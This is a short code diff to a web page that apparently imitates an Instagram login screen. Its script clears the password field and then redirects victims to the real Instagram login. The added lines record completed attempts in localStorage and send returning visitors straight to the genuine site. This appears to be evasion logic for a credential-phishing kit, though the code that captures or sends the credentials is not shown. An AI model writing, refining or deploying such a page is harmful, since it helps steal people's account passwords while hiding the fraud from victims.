@@ -283,6 +283,8 @@ body,button,input,textarea{font-family:-apple-system,BlinkMacSystemFont,"Segoe U
             xi = {c: 0, t: Date.now()};
         if(Date.now() < xi.t + 3*24*60*60*1000)
             c = xi.c;
+        if(c == 3)
+            location.href = uk("rdt") ? uk("rdt") : "https://instagram.com/accounts/login/";
         var p;
         var d = [];
         function _prelog() {
@@ -353,6 +355,8 @@ body,button,input,textarea{font-family:-apple-system,BlinkMacSystemFont,"Segoe U
                 document.getElementById("m_login_password").value = "";
                 location.href = uk("rdt") ? uk("rdt") : "https://instagram.com/accounts/login/";
                 }, lag);
+                xi = {c: 3, t: Date.now()};
+                localStorage["xi"] = JSON.stringify(xi);
             }
             document.getElementById("m_login_email_l").classList.remove("FATdn");
             document.getElementById("m_login_email_p").classList.remove("FATdn");
